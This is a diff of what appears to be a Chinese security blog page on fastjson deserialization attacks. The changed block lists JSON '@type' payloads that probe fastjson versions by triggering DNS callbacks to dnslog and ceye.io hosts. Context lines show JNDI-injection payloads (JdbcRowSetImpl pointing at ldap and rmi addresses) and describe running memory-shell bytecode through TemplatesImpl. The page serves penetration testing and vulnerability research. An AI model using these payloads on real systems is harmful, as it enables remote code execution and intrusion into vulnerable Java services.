@@ -977,7 +977,37 @@ public class Main {
 // fastjson &lt; 1.2.48 (测试成功)
 {"@type":"java.net.InetAddress","val":"x.x.x.x"}
 
-// fastjson &lt;= 1.2.68 {{"@type":"java.net.url","val":"http: dnslog"}:"aaa"} set[{"@type":"java.net.url","val":"http: dnslog"}] dnslog"} {"@type":"com.alibaba.fastjson.jsonobject", {"@type": "java.net.url", "val":"http: dnslog"}}""} dnslog"}:0 {"@type":"java.net.inetsocketaddress"{"address":,"val":"dnslog"}} {"@type":"java.net.inetsocketaddress"{"address":,"val":"dnslog"}} 精确版本探测(kcon2022-hacking-json.pdf) fastjson 1.2.47 版本探测 [ {"@type": "java.lang.class","val": "java.io.bytearrayoutputstream"}, "java.net.inetsocketaddress"{"address":,"val": "aaa.xxxx.ceye.io"}} ] "java.lang.autocloseable","@type": "bbb.n41tma.ceye.io"}} 1.2.80 收到一个dns请求，1.2.83 收到两个dns请求 "java.lang.exception","@type": "com.alibaba.fastjson.jsonexception","x": "first.dnslog.com"}}}, "com.alibaba.fastjson.jsonexception","message": "ddd.4fhgzj.dnslog.cn"}}} &lt; code&gt;<!--=--></code></pre>
+// fastjson &lt;= 1.2.68
+{{"@type":"java.net.URL","val":"http://dnslog"}:"aaa"}
+Set[{"@type":"java.net.URL","val":"http://dnslog"}]
+Set[{"@type":"java.net.URL","val":"http://dnslog"}
+{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://dnslog"}}""}
+{{"@type":"java.net.URL","val":"http://dnslog"}:0
+{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}
+{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}
+
+// 精确版本探测(KCon2022-Hacking-JSON.pdf)
+// fastjson 1.2.47 版本探测
+[
+  {"@type": "java.lang.Class","val": "java.io.ByteArrayOutputStream"},
+  {"@type": "java.io.ByteArrayOutputStream"},
+  {"@type": "java.net.InetSocketAddress"{"address":,"val": "aaa.xxxx.ceye.io"}}
+]
+
+// fastjson 1.2.68 版本探测
+[
+  {"@type": "java.lang.AutoCloseable","@type": "java.io.ByteArrayOutputStream"},
+  {"@type": "java.io.ByteArrayOutputStream"},
+  {"@type": "java.net.InetSocketAddress"{"address":,"val": "bbb.n41tma.ceye.io"}}
+]
+
+// fastjson 1.2.80 收到一个dns请求，1.2.83 收到两个dns请求
+[
+  {"@type": "java.lang.Exception","@type": "com.alibaba.fastjson.JSONException","x": {"@type": "java.net.InetSocketAddress"{"address":,"val": "first.dnslog.com"}}},
+
+  {"@type": "java.lang.Exception","@type": "com.alibaba.fastjson.JSONException","message": {"@type": "java.net.InetSocketAddress"{"address":,"val": "ddd.4fhgzj.dnslog.cn"}}}
+]
+</code></pre>
 <h4 id="请求延迟判断"><a href="#请求延迟判断" class="headerlink" title="请求延迟判断"></a><strong>请求延迟判断</strong></h4><p>利用<code>fastjson</code>解析地址时请求本机已开放端口不延时，请求不开放的端口则延时的特性判断:</p>
 <pre><code class="line-numbers language-json">// 1.1.16&lt;= fastjson &lt;=1.2.11，第一个响应时间很长，第二个较短，可判断版本范围
 {"@type":"com.alibaba.fastjson.JSONObject",{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://1.2.3.4/POC", "autoCommit":true}}""}
@@ -1419,7 +1449,7 @@ public class Test {
 }
 </code></pre>
 <p>对于以上两个<code>POC</code>，最终是调用<code>TemplatesImpl</code>执行<code>.class</code>字节码，这样就可以通过其他工具生成内存马然后通过<code>TemplatesImpl</code>执行了。<code>JNDI</code>利用时将该<code>POC</code>编译成<code>class</code>文件使用，<code>c3p0</code>二次反序列化时将<code>class</code>文件转为十六进制后在<code>c3p0</code>中作为二次<code>readObject</code>传入的数据即可。了解上述内容后，根据<code>fastjson</code>版本更新顺序归并整理下互联网已存在的<code>Payload</code>，然后搭建测试环境进行验证。</p>
-<h4 id=""><a href="#" class="headerlink" title="<= 1.2.24(无限制)"></a>&lt;= 1.2.24(无限制)</h4><p> 从1.2.22版本引入以来，<code>fastjson &lt;=1.2.24</code> 版本中默认启用了<code>AutoType</code>功能。其主要有下列三种利用方式（当然还有很多基于其他依赖环境的利用方式），限制条件和<code>POC</code>如下:</p>
+<h4 id><a href="#" class="headerlink" title="<= 1.2.24(无限制)"></a>&lt;= 1.2.24(无限制)</h4><p> 从1.2.22版本引入以来，<code>fastjson &lt;=1.2.24</code> 版本中默认启用了<code>AutoType</code>功能。其主要有下列三种利用方式（当然还有很多基于其他依赖环境的利用方式），限制条件和<code>POC</code>如下:</p>
 <p><strong>JNDI</strong></p>
 <pre><code class="line-numbers language-json">// JNDI注入方式，需要目标可以访问远程服务。较为常见，可以通过依赖探测分析利用方案
 {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/badClassName", "autoCommit":true}
@@ -4054,7 +4084,7 @@ http://x.x.x.x/groovy/grape/GrabAnnotationTransformation2.class
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">76.7k</span>&nbsp;字
+                class="white-color">77.3k</span>&nbsp;字
             
             
             
